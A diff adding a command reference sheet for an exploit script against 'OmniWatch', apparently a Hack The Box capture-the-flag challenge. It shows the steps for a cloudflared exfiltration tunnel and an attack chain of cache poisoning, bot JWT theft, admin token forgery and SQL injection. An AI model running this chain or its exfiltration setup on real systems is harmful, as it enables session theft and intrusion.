@@ -1,0 +1,120 @@
+╔════════════════════════════════════════════════════════════════════════╗
+║                   OMNIWATCH EXPLOIT - COMMAND REFERENCE                ║
+╚════════════════════════════════════════════════════════════════════════╝
+
+┌────────────────────────────────────────────────────────────────────────┐
+│ STEP 1: INSTALL DEPENDENCIES (ONE-TIME SETUP)                         │
+└────────────────────────────────────────────────────────────────────────┘
+
+pip3 install requests flask pyjwt
+
+┌────────────────────────────────────────────────────────────────────────┐
+│ STEP 2: START EXFILTRATION TUNNEL (TERMINAL 1)                        │
+└────────────────────────────────────────────────────────────────────────┘
+
+cloudflared tunnel --url http://localhost:9090
+
+Output will show:
+  https://xxx-yyy-zzz.trycloudflare.com  ← Copy this URL
+
+┌────────────────────────────────────────────────────────────────────────┐
+│ STEP 3: RUN EXPLOIT (TERMINAL 2)                                      │
+└────────────────────────────────────────────────────────────────────────┘
+
+python3 omniwatch_exploit.py <IP> <PORT> <TUNNEL_URL>
+
+Example for current instance:
+python3 omniwatch_exploit.py 83.136.252.27 44963 https://xxx.trycloudflare.com
+
+Example for future instance:
+python3 omniwatch_exploit.py <NEW_IP> <NEW_PORT> https://xxx.trycloudflare.com
+
+┌────────────────────────────────────────────────────────────────────────┐
+│ EXPECTED TIME                                                          │
+└────────────────────────────────────────────────────────────────────────┘
+
+• Setup: 30 seconds (one-time)
+• Exploit: 30-90 seconds (waits for bot)
+• Total: ~1-2 minutes
+
+┌────────────────────────────────────────────────────────────────────────┐
+│ OUTPUT FILES                                                           │
+└────────────────────────────────────────────────────────────────────────┘
+
+Flag saved to: /tmp/omniwatch_flag.txt
+
+View with: cat /tmp/omniwatch_flag.txt
+
+┌────────────────────────────────────────────────────────────────────────┐
+│ TROUBLESHOOTING COMMANDS                                               │
+└────────────────────────────────────────────────────────────────────────┘
+
+# Check if target is up:
+curl -I http://<IP>:<PORT>
+
+# Check if bot is running:
+curl http://<IP>:<PORT>/controller/bot_running
+
+# Kill stuck processes:
+pkill -f omniwatch
+pkill cloudflared
+
+# Check dependencies:
+pip3 list | grep -E "requests|flask|jwt"
+
+# View detailed help:
+cat QUICKSTART.md
+cat README_USAGE.md
+
+┌────────────────────────────────────────────────────────────────────────┐
+│ QUICK COPY-PASTE TEMPLATE                                             │
+└────────────────────────────────────────────────────────────────────────┘
+
+# Terminal 1:
+cloudflared tunnel --url http://localhost:9090
+
+# Terminal 2 (replace with your values):
+python3 omniwatch_exploit.py 83.136.252.27 44963 https://YOUR-URL.trycloudflare.com
+
+┌────────────────────────────────────────────────────────────────────────┐
+│ SUCCESS INDICATORS                                                     │
+└────────────────────────────────────────────────────────────────────────┘
+
+[+] Target is reachable               → Connection OK
+[+] Exfiltration server ready         → Setup complete
+[+] Bot is RUNNING                    → Bot detected
+[+] Cache poisoned successfully!      → Stage 1 done
+[+] JWT token stolen from bot!        → Stage 2 done
+[+] JWT secret leaked                 → Stage 3 done
+[+] Administrator JWT forged!         → Stage 4 done
+[+] SQL injection executed            → Stage 5 done
+
+================================================================================
+FLAG RETRIEVED:
+HTB{...}                               → SUCCESS!
+================================================================================
+
+┌────────────────────────────────────────────────────────────────────────┐
+│ KEYBOARD SHORTCUTS                                                     │
+└────────────────────────────────────────────────────────────────────────┘
+
+Ctrl+C  → Stop exploit gracefully
+Ctrl+Z  → Pause (use 'fg' to resume)
+Ctrl+D  → Exit terminal
+
+┌────────────────────────────────────────────────────────────────────────┐
+│ FILES OVERVIEW                                                         │
+└────────────────────────────────────────────────────────────────────────┘
+
+omniwatch_exploit.py      ← Main script (USE THIS)
+setup_exfil.sh            ← Helper to setup tunnel
+QUICKSTART.md             ← Quick start guide (30 sec)
+README_USAGE.md           ← Full documentation
+COMMAND_REFERENCE.txt     ← This file
+
+╔════════════════════════════════════════════════════════════════════════╗
+║                                                                        ║
+║  SAVE THIS FILE FOR QUICK REFERENCE!                                  ║
+║  Run: python3 omniwatch_exploit.py <IP> <PORT> <TUNNEL_URL>          ║
+║                                                                        ║
+╚════════════════════════════════════════════════════════════════════════╝
